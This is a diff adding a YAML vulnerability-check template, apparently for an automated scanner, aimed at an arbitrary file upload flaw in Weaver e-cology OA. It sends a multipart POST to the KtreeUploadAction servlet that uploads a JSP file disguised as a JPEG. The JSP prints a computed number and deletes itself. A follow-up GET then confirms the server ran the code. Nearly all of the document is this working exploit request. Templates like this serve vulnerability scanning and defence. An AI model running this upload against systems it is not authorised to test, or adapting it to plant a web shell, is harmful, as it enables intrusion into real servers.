@@ -1,0 +1,39 @@
+name: yaml-poc-weaver-weaver_e_cology_oa-file_upload-CT-490587
+binding: 8f370af2-4602-4c06-a2be-d75a0f05aa46
+detail:
+    author: system_user
+    links:
+        - https://mp.weixin.qq.com/s/3ip7-U8BsWgq3N4SP5xd4w
+    vulnerability:
+        id: e5082950-1c29-4a28-97ce-ed44bbe28f25
+        level: critical
+    warning: File Upload (Auto Clear)
+transport: http
+set:
+    r1: randomInt(40000, 44800)
+    r2: randomInt(40000, 44800)
+    rboundary: randomLowercase(8)
+    randname: randomLowercase(6)
+rules:
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+            body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"test\"; filename=\"{{randname}}.jsp\"\r\nContent-Type: image/jpeg\r\n\r\n<%out.print({{r1}} * {{r2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(b"SUCCESS")
+        output:
+            search: |
+                ",'url':'/(?P<furl>.*?.jsp)',".bsubmatch(response.body)
+            furl: search["furl"]
+    r2:
+        request:
+            cache: true
+            method: GET
+            path: /{{furl}}
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+expression: r1() && r2()
